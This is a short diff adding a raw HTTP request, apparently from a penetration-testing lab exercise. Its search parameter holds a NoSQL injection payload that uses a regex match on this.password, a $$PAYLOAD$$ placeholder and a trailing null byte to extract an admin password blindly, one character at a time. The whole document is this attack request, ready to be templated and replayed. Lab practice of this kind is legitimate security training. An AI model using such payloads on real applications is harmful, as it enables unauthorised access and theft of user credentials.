@@ -1,0 +1,2 @@
+GET /?search=admin%27+%26%26+this.password.match(/^$$PAYLOAD$$.*$/)%00 HTTP/1.1
+Host: ptl-b4178f0b-d147a1d2.libcurl.so
